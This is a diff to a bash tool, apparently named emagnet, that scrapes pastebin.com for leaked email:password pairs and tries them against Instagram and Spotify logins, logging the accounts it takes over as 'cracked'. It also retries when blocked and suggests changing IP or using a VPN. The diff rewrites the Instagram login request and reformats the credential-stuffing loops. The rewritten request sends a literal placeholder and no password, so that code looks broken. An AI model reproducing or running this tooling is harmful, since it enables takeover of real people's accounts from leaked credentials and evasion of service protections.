@@ -79,12 +79,14 @@ cat << EOF
 Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
 
   -a, --author        Show author information.
+
   -b, --backup        Create a compressed archive
                       - Available options: all/incoming/archive
   -l, --license       Show license information.
   -h, --help          Display this very helpful text
   -n, --notify        Set notifications on or off
   -t, --time          Set refresh time in seconds
+
   -v, --vpn           Toggle VPN on or off (Linux Only)
                       - Available options: true/false
                       Use: -v -p <provider> for set provider
@@ -200,16 +202,13 @@ emagnet_quiet() {
 }
 
 emagnet_notice_about_scraping() {
-   emagnet_clear
-   emagnet_banner
+   emagnet_clear;emagnet_banner
    echo -e "                            \e[1;31mNOTICE\e[0m:\n"
    echo -e "[\e[1;31m<<\e[0m] - You are scraping pastbin.com way too fast! \e[1;31mSlow Down\e[0m!"
    echo -e "[\e[1;31m<<\e[0m] - Pastebin has blocked you from the archive page until you slow down."
    echo -e "[\e[1;31m<<\e[0m] - You will only be able to download 8 files at time until you raise TIME"
    echo -e "[\e[1;31m<<\e[0m] - The block from pastebin.com/archive will be lifted within 20 minutes.."
-   sleep 7
-   emagnet_clear
-   emagnet_banner
+   sleep 7;emagnet_clear;emagnet_banner
  }
 
 emagnet_kill() {
@@ -246,31 +245,31 @@ emagnet_I_was_banned() {
 curl -sL -H "$USERAGENT" "$PASTEBIN" \
 |grep -q "blocked your IP"
 if [[ "$?" = "0" ]]; then
-  		if [[ "$VPN" = "false" ]]; then
-                   emagnet_clear
-                   emagnet_banner
-   	   	       for (( ; ; )); do
-     		         wait_time=${IDLETIME}
-      		         temp_cnt=${wait_time}
-   		           while [[ "${temp_cnt}" -gt "0" ]]; do
-                              echo -e  "\rIP: [\e[1;31m$$WIP\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
-                              printf " seconds"
-      		              sleep 1
-      		              ((temp_cnt--))
-  	                   done
-                         printf "\n"
-                         emagnet_clear
-                         emagnet_banner
-                         bash "$basename$0" --emagnet
-                         sleep 2
-                       done
-                    emagnet_clear
-                    emagnet_banner
-         	    bash "$basename$0" --emagnet
-        	 exit 1
-      else
-                    emagnet_banned
-      fi
+  if [[ "$VPN" = "false" ]]; then
+    emagnet_clear
+    emagnet_banner
+        for (( ; ; )); do
+     	    wait_time=${IDLETIME}
+          temp_cnt=${wait_time}
+   		        while [[ "${temp_cnt}" -gt "0" ]]; do
+                  echo -e  "\rIP: [\e[1;31m$$WIP\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
+                  printf " seconds"
+                  sleep 1
+                  ((temp_cnt--))
+  	          done
+          printf "\n"
+          emagnet_clear
+          emagnet_banner
+          bash "$basename$0" --emagnet
+          sleep 2
+        done
+   emagnet_clear
+   emagnet_banner
+   bash "$basename$0" --emagnet
+   exit 1
+  else
+ emagnet_banned
+ fi
 fi
 }
 
@@ -614,12 +613,8 @@ fi
 }
 
 emagnet_instagrambruter() {
-URL="https://www.instagram.com/accounts/login/ajax/"
-ACCEPTLANG="Accept-Language: sv-SE,en;q=0.7,en-US;q=0.3"
-ACCEPT="Accept: */*'"
-XCSFRTOKEN="X-CSRFToken: $(openssl rand -hex 30 | cut -c 1-33)"
-AJAX="X-Instagram-AJAX: 4a1f95f94afb' -H 'X-IG-App-ID: 936619743392459"
-CSFRTOKEN="$(openssl rand -hex 30 | cut -c 1-33)"
+URL="https://www.instagram.com/accounts/login/ajax/?hl=en"
+xCFSRTOKEN="$(< /dev/urandom tr -dc A-Za-z0-9 | head -c${1:-32};echo)"
 
     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
@@ -630,22 +625,7 @@ CSFRTOKEN="$(openssl rand -hex 30 | cut -c 1-33)"
 while read instagramlogin; do
 INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
 INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
-
-curl -s "$URL" -H 'sec-fetch-mode: cors' -H \
-'origin: https://www.instagram.com' -H \
-'x-ig-www-claim: 0' -H \
-'accept-language: en-US,en;q=0.9' -H \
-'$USERAGENT' -H \
-'x-requested-with: XMLHttpRequest' -H \
-"cookie: ig_cb=1; csrftoken=$CSFRTOKEN; rur=ATN; mid=XW7rUgAEAAFeErDMdCAja23Ty9KE" -H \
-"x-csrftoken: $CSFRTOKEN" -H \
-'x-ig-app-id: 936619743392459' -H 'accept-encoding: gzip, deflate, br' -H \
-'x-instagram-ajax: 6c66f7292327-hot' -H \
-'content-type: application/x-www-form-urlencoded' -H \
-'accept: */*' -H 'referer: https://www.instagram.com/' -H \
-'authority: www.instagram.com' -H \
-'sec-fetch-site: same-origin' --data \
-"username=${INSTAGRAM_USER}"|grep -i 'checkpoint|/"status": "ok"'
+curl "$URL" -H "$USERAGENT" -H 'x-requested-with: XMLHttpRequest' -H "x-csrftoken: $xCFSRTOKEN" -H "referer: $URL" --data 'username=INSTAGRAM_USER' 
 if [[ $? -eq "0" ]]; then
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
          echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
@@ -692,12 +672,11 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
-     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
-    |awk '{print $1}' \
-    |cut -d':' -f2,3 \
-    |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
-
+                      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+                     |awk '{print $1}' \
+                     |cut -d':' -f2,3 \
+                     |cut -d'|' -f1 \
+                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
               	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
             	        echo -e "================================================================"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
              	        echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
@@ -710,15 +689,15 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
                         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
                         FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
               fi
-      done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
-    if [[ $FAILED -gt "0" ]]; then
-       printf "%64s \n" | tr ' ' '='
-       echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
-       sleep 3
-       rm "$HOME/.config/emagnet/tmp/.emagnet-{failed,cracked}"
-    else
-       sleep 0
-    fi
+        done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
+           if [[ $FAILED -gt "0" ]]; then
+                  printf "%64s \n" | tr ' ' '='
+                  echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
+                  sleep 3
+                  rm "$HOME/.config/emagnet/tmp/.emagnet-{failed,cracked}"
+             else
+                  sleep 0
+           fi
 }
 
 emagnet_gmail_bruter() {
@@ -811,7 +790,7 @@ fi
 
 if [[ -z "$SYNTAX2DL" ]]; then echo -e "$basename$0: internal error -- you must include a syntax language (ex: bash, python or perl).";exit 1;fi
 
-curl -Ls "$PASTEBIN/archive/$SYNTAX2DL" \
+ curl -Ls "$PASTEBIN/archive/$SYNTAX2DL" \
 |grep -o '<a href="/........' \
 |cut -d'/' -f2 \
 |grep -E '[0-9]{1,4}' \
@@ -932,8 +911,7 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
                             echo -e "                       - Passwords Found \r             [\e[1;31m00\e[0m] "
                             echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
-
-                               sleep 2
+                            sleep 2
                       else
                       if [[ "$NOTIFY" = "true" ]]; then
                               notify-send "Emagnet" "\n
@@ -944,9 +922,7 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
                             echo -e "                       - Passwords found \r             [\e[1;31m00\e[0m] "
                             echo -e "                       - Email Addresses Found \r             [\e[1;31m00\e[0m] \n"
-
-                             sleep 2
-
+                            sleep 2
               fi
 
 # No matter what we found, move incoming files to archive and remove temp files
@@ -981,7 +957,7 @@ emagnet_run4ever() {
                 echo -e "[\e[1;31m<<\e[0m] - Busted! I told you, \e[1;31mDON'T\e[0m scrape pastebin to often."
                 echo -e "[\e[1;31m<<\e[0m] - and set time to <150 seconds. This block wont be lifted until ~1 week"
                 echo -e "[\e[1;31m<<\e[0m] - There is one solution. Change IP OR wait one week and run emagnet again"
-                echo -e "[\e[1;31m<<\e[0m] - I saying it once again, don't set TIME to <150 seconds.."
+                echo -e "[\e[1;31m<<\e[0m] - Do not set TIME to <150 seconds.."
                 exit 1
             fi
           fi
